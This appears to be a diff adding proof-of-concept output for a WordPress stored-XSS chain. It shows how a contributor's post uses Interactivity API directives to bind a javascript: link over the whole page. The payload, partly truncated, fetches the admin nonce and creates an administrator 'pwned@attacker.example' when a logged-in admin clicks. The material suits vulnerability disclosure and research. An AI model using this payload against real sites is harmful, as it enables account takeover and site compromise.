@@ -1,0 +1,40 @@
+==============================================================================
+A. Contributor submits the post. kses is the only thing between the
+   attacker and the front end, and it keeps every directive.
+==============================================================================
+   contributor role caps: unfiltered_html = False
+   POST /wp/v2/posts -> 201 id 1008 status pending
+   stored content (this IS the kses output):
+      <div data-wp-interactive="{&quot;namespace&quot;:&quot;pwn&quot;}" data-wp-context="{&quot;u&quot;: &quot;javascript:fetch(&apos;/wp-admin/user-new.php&apos;).then(function(r){return r.text()}).then(function(t){var n=t.match(/_wpnonce_create-user. value=.([a-f0-9]+)/)[1];var b=new URLSearchParams(); ...
+   directives that survived: ['data-wp-interactive', 'data-wp-context', 'data-wp-bind--href', 'data-wp-bind--style']
+   editor publishes it -> 200 publish | http://localhost:8371/?p=1008
+
+==============================================================================
+B. The SERVER refuses both bindings.
+   href  -> esc_url()            in WP_HTML_Tag_Processor::set_attribute()
+   style -> safecss_filter_attr() has no position / inset / z-index
+==============================================================================
+    <a id="pwnlink" data-wp-bind--href="context.u" data-wp-bind--style="context.s">
+    href= written by the server : False
+    style= written by the server: False
+    interactivity runtime on the page: True
+
+==============================================================================
+C. The BROWSER applies both, and one click takes the site over.
+==============================================================================
+   users before: user_login,roles | admin,administrator | author,author | contributor,contributor | editor,editor | subscriber,subscriber
+   an administrator is logged in in this browser: True
+   DOM href : javascript:fetch('/wp-admin/user-new.php').then(function(r){return r.text()}).then(functio ...
+   DOM style: position: fixed; inset: 0px; z-index: 2147483647; display: block;
+   anchor {'w': 1280, 'h': 720} vs viewport {'w': 1280, 'h': 720} -> the link covers the entire page: True
+   one click at the centre of the page -> {"status": 200}
+   users after : user_login,user_email,roles | admin,admin@example.test,administrator | author,author@example.test,author | contributor,contributor@example.test,contributor | editor,editor@example.test,editor | pwned,pwned@attacker.example,administrator | subscriber,subscriber@example.test,subscriber
+
+==============================================================================
+D. Honest precondition: the runtime has to be on the page.
+   Rendering the same content with the interactivity module suppressed.
+==============================================================================
+   DOM href with the runtime blocked: null
+   -> the runtime is what applies the binding. It is enqueued by any
+      interactive block on the page; the default block theme's
+      core/navigation block puts it on every front-end view.
